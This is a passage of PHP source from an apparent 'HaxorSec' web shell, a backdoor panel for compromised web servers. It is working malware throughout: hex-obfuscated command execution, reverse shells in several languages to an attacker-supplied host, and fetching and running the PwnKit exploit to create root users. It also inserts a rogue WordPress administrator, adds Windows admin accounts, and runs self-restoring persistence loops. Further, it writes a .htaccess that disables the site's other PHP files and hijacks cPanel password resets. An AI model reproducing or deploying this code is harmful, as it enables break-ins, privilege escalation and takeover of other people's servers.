                    popup: 'animate__animated animate__fadeInDown'
                }
            })</script>";
        } else if ($_GET['response'] == "failed") {
            echo "<script>
            Swal.fire({
                icon: 'error',
                title: 'Failed',
                text: 'Operation failed!',
                confirmButtonColor: '#3b82f6',
                background: '#0f172a',
                color: '#e2e8f0',
                timer: 3000,
                showConfirmButton: true, 
                animation: true,
                customClass: {
                    popup: 'animate__animated animate__shakeX'
                }
            })</script>";
        }
        ?>
    </body>
    </html>
    <?php

if (isset($_POST['submitwp'])) {
    $db_name = $_POST['db_name'];
    $db_user = $_POST['db_user'];
    $db_pass = $_POST['db_pass'];
    $db_host = $_POST['db_host'];
    $wp_user = $_POST['wp_user'];
    $wp_pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);

    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

    if ($conn->connect_error) {
        failed();
        die("Error Cug : " . $conn->connect_error);
    }

    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'HaxorSec', '', '', NOW(), '', 0, 'HaxorSec')";

    $sqltakeuserid = "SELECT ID FROM wp_users WHERE user_login = '$wp_user'";

    if ($conn->query($sql) === TRUE && $conn->query($sqltakeuserid)) {
        $result = $conn->query($sqltakeuserid);

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $user_id = $row["ID"];

            $sqlusermeta = "INSERT INTO wp_usermeta (umeta_id, user_id, meta_key, meta_value) VALUES ('', $user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";

            if ($conn->query($sqlusermeta) === TRUE) {
                Success();
            } else {
                echo "Error: " . $sqlusermeta . "\n" . $conn->error;
            }
        } else {
            echo "User tidak ditemukan.\n";
        }

        Success();
    } else {
        echo "Error: " . $sql . "\n" . $conn->error;
    }

    $conn->close();
}



if (isset($_GET['unlockshell'])) {
    if (cmd("killall -9 php") && cmd("pkill -9 php")) {
        success();
    } else {
        failed();
    }
}
if (isset($_POST['pid'])) {
    if (cmd("kill ". $_POST['pid'])) {
        success();
    } else {
        $name = cmd("ps -p ".$pid." -o comm= 2>&1");
        if (!empty($name)) {
            $pkillOutput = cmd("pkill -9 $name 2>&1");
            success();
        } else {
            failed();
        }
    }
    exit;
}

if (isset($_POST['submit-bc'])) {
    $HostServer = $_POST['backconnect-host'];
    $PortServer = $_POST['backconnect-port'];
    if ($_POST['haxorsec-bc'] == "perl") {
        echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
    } else if ($_POST['haxorsec-bc'] == "python") {
        echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    } else if ($_POST['haxorsec-bc'] == "ruby") {
        echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
    } else if ($_POST['haxorsec-bc'] == "bash") {
        echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['haxorsec-bc'] == "php") {
        echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
    } else if ($_POST['haxorsec-bc'] == "nc") {
        echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
    } else if ($_POST['haxorsec-bc'] == "sh") {
        echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['haxorsec-bc'] == "xterm") {
        echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
    } else if ($_POST['haxorsec-bc'] == "golang") {
        echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
    }
}



if (isset($_GET['lockshell'])) {
    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    $TmpNames = $fungsi[31]();
    if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'))) {
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler'));
    }
    mkdir($TmpNames . "/.sessions");
    cmd("cp $curFile " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
    chmod($curFile, 0444);
    $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . __DIR__ . '")){
        mkdir("' . __DIR__ . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", ' . $fungsi[32] . '($text));
    }
    if (haxorsec_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (haxorsec_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function haxorsec_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
    if ($hndlers) {
        $php = PHP_BINARY;
        if (!is_executable($php)) {
            $php = 'php';
        }
        $cmd = $php . ' ' . $TmpNames . '/.sessions/.' . $fungsi[33](
            $fungsi[0]() . remove_dot($curFile) . '-handler') . ' > /dev/null 2>/dev/null &';
            cmd($cmd);
            success();
    } else {
        failed();
    }
}
if (isset($_POST['haxorsec-up-submit'])) {
    $namaFilenya = $_FILES['haxorsec-upload']['name'];
    $tmpName = $_FILES['haxorsec-upload']['tmp_name'];
    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
        success();
    } else {
        failed();
    }
}
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}
if (isset($_POST['bitninja-up-submit'])) {
    $namaFilenyaa = $_FILES['bitninja-upload']['name'];
    $tmpNamee = $_FILES['bitninja-upload']['tmp_name'];
    if ($fungsi[29]($tmpNamee, $fungsi[0]() . "/" . $namaFilenyaa)) {
        $ff = generateRandomString() .".php";
        @$GLOBALS['fungsi'][34]($namaFilenyaa,$ff);
        echo "<script>alert('Success! Your Name Files ".$ff."');</script>";
        @$GLOBALS['fungsi'][24]($namaFilenyaa);
    }else{
        failed();
    }
}
if (isset($_GET['destroy'])) {
    $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
    $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    if ($fungsi[4]($DOC_ROOT)) {
        $htaccess = '
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
    Deny from all
</FilesMatch>
<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
    Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
    Allow from all
</FilesMatch>';
        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
        if ($put_htt) {
            success();
        } else {
            failed();
        }
    } else {
        failed();
    }
}


if (isset($_POST['save-editor'])) {
    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
    if ($save) {
        success();
    } else {
        failed();
    }
}

if (isset($_GET['adminer'])) {
    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
    if (!$fungsi[3]('adminer.php')) {
        $fungsi[28]("adminer.php", $fungsi[11]($URL));
        success();
    }
}


if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/ly4k/PwnKit/raw/main/PwnKit"));
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .haxorsec-root');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
    }
}

if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['haxorsec-select'] == "delete") {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); 
            $fd = $repl . "/" . $it;
    
            if (is_dir($fd)) {
                $rmdir = unlinkDir($fd); 
                $rmdir ? success() : failed();
            } elseif (is_file($fd)) {
                $rmfile = $fungsi[24]($fd); 
                $rmfile ? success() : failed();
            } else {
                failed(); 
            }
        }
    } else if ($_POST['haxorsec-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if (ExtractArchive($fd, $repl . '/') == true) {
                success();
            } else {
                failed();
            }
        }
    } else if ($_POST['haxorsec-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
                compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
            }
        }
    }
}

if (isset($_POST['submit'])) {
    if ($_POST['resetcp'] == true) {
        $emailCp = $_POST['resetcp'];
        $path0cp = dirname($_SERVER['DOCUMENT_ROOT']);
        $pathcp = $path0cp . "/.cpanel/contactinfo";
        $contactinfo = '
"email" : "' . $emailCp . '"
        ';
        if ($fungsi[3]($pathcp)) {
            $fungsi[28]($pathcp, $contactinfo);
            echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">';
        } else {
            failed();
        }
    }
    if ($_POST['create_folder'] == true) {
        $NamaFolder = $fungsi[12]($_POST['create_folder']);
        if ($NamaFolder) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['create_file'] == true) {
        $namaFile = $fungsi[13]($_POST['create_file']);
        if ($namaFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['renameFile'] == true) {
        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
        if ($renameFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['chFile']) {
        $permString = $_POST['chFile']; 
        $permOctal = octdec($permString); 
        $chFiles = $fungsi[30](unx($_GET['ch']), $permOctal);
        if ($chFiles) {
            success();
        } else {
            failed();
        }
    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://github.com/ly4k/PwnKit/raw/main/pwnkit -O pwnkit');
            cmd('chmod +x pwnkit');
            cmd('./pwnkit "id" > .haxorsec-root');
            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
        } else if ($fungsi[3]('.haxorsec-root')) {
            $response = $fungsi[11]('.haxorsec-root');
            $r_text = explode(" ", $response);
            if ($r_text[0] == "uid=0(root)") {
                $username = $_POST['add-username'];
                $password = $_POST['add-password'];
                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '\n' . $password . '" | passwd ' . $username . '"');
            } else {
                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
            }
        }
    } else if ($_POST['lockfile'] == true) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler'));
        }
        mkdir($TmpNames . "/.sessions");
        cmd("cp $flesName " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
        cmd("chmod 444 " . $flesName);
        $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $fungsi[0]() . '")){
        mkdir("' . $fungsi[0]() . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", ' . $fungsi[32] . '($text));
    }
    if (haxorsec_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (haxorsec_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}

function haxorsec_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
        if ($hndlers) {
            $php = PHP_BINARY;
            if (!is_executable($php)) {
                $php = 'php';
            }
            $cmd = $php . ' ' . $TmpNames . '/.sessions/.' . $fungsi[33](
                $fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &';
                cmd($cmd);
                success();
        } else {
            failed();
        }
    } else if ($_POST['add-rdp'] == True) {
        $userRDP = $_POST['add-rdp'];
        $passRDP = $_POST['add-rdp-pass'];
        if (stristr(PHP_OS, "WIN")) {
            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add");
            if ($procRDP) {
                cmd("net localgroup administrators " . $userRDP . " /add");
                success();
            } else {
                failed();
            }
        } else {
            failed();
        }
    } else if ($_POST['mail-from-smtp'] == True) {
        $emailFrom = $_POST['mail-from-smtp'];
        $emailTo = $_POST['mail-to-smtp'];
        $emailSubject = $_POST['mailto-subject'];
        $messageMail = $_POST['message-smtp'];
        $headersMail = 'From: ' . $emailFrom . '' . "\r\n" .
            'Reply-To: ' . $emailFrom . '' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();
        $procMailSmTp = mail($emailTo, $emailSubject, $messageMail, $headersMail);
        if ($procMailSmTp) {
            success();
        } else {
            failed();
        }
    }
}

if ($_GET['response'] == "success") {
    echo "<script>
    Swal.fire({
        icon: 'success',
        title: 'Success!',
        text: 'Operation completed successfully!',
        confirmButtonColor: '#7c3aed',
        background: '#0f172a',
        color: '#e2e8f0',
        timer: 3000, // Auto close after 3 seconds
        showConfirmButton: true, 
        animation: true,
        customClass: {
            popup: 'animate__animated animate__fadeInDown'
        }
    });
    </script>";
} else if ($_GET['response'] == "failed") {
    echo "<script>
    Swal.fire({
        icon: 'error',
        title: 'Failed!',
        text: 'Operation failed. Please try again.',
        confirmButtonColor: '#7c3aed',
        background: '#0f172a',
        color: '#e2e8f0',
        timer: 3000, // Auto close after 3 seconds
        showConfirmButton: true, 
        animation: true,
        customClass: {
            popup: 'animate__animated animate__shakeX'
        }
    });
    </script>";
}


function success()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
}
function failed()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
}

function formatSize($bytes)
{
    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}


function hx($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unx($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}

function suggest_exploit()
{
    $uname = $GLOBALS['fungsi'][8]();
    $xplod = explode(" ", $uname);
    $xpld = explode("-", $xplod[2]);
    $pl = explode(".", $xpld[0]);
    return $pl[0] . "." . $pl[1] . "." . $pl[2];
}
function s()
{
    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "$count Domain";
    }
    return $dom;
}

function cmd($in, $re = false)
{
    $out = '';
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("\x65\x78\x65\x63")) {
            @$GLOBALS['fungsi'][16]($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
            $out = $GLOBALS['fungsi'][19]($in);
        } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) {
            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                $GLOBALS['fungsi'][21]($f);
            }
        } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
        }
    } catch (Exception $e) {
    }
    return $out;
}


function winpwd()
{
    return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
}

function compressToZip($sourceFile, $zipFilename)
{
    $zip = new ZipArchive();

    if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) {
        $zip->addFile($sourceFile, basename($sourceFile));
        $zip->close();
        success();
    } else {
        failed();
    }
}

function remove_slash($val)
{
    $tex = str_replace("/", "", $val);
    $tex1 = str_replace(":", "", $tex);
    $tex2 = str_replace("_", "", $tex1);
    $tex3 = str_replace(" ", "", $tex2);
    $tex4 = str_replace(".", "", $tex3);
    return $tex4;
}

function unlinkDir($dir)
{
    $dirs = array($dir);
    $files = array();

    // Loop untuk mengumpulkan semua file dan folder di dalam direktori
    for ($i = 0;; $i++) {
        if (isset($dirs[$i]))
            $dir = $dirs[$i];
        else
            break;

        if ($openDir = @opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {
                    $path = $dir . "/" . $readDir;

                    if ($GLOBALS['fungsi'][2]($path)) { // is_dir
                        $dirs[] = $path;
                    } else {
                        $files[] = $path;
                    }
                }
            }
            closedir($openDir);
        }
    }

    // Hapus semua file
    foreach ($files as $file) {
        if (!@$GLOBALS['fungsi'][24]($file)) { // unlink
            return false; // Gagal hapus file
        }
    }

    // Hapus semua direktori dari paling dalam ke luar
    $dirs = array_reverse($dirs);
    foreach ($dirs as $dir) {
        if (!@$GLOBALS['fungsi'][25]($dir)) { // rmdir
            return false; // Gagal hapus direktori
        }
    }

    return true; // Berhasil sepenuhnya
}


function remove_dot($file)
{
    $FILES = $file;
    $pch = explode(".", $FILES);
    return $pch[0];
}


function windowsDriver()
{
    $winArr = [
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
    ];
    foreach ($winArr as $winNum => $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
        }
    }
}

function namaPanjang($value)
{
    $namaNya = $value;
    $extensi = pathinfo($value, PATHINFO_EXTENSION);
    if (strlen($namaNya) > 30) {
        return substr($namaNya, 0, 30) . "...";
    } else {
        return $value;
    }
}

function extractArchive($archiveFilename, $extractPath)
{
    $zip = new ZipArchive();

    if ($zip->open($archiveFilename) === TRUE) {
        $zip->extractTo($extractPath);
        $zip->close();
        return true;
    } else {
        return false;
    }
}

function perms($file)
{
    $perms = $GLOBALS['fungsi'][6]($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>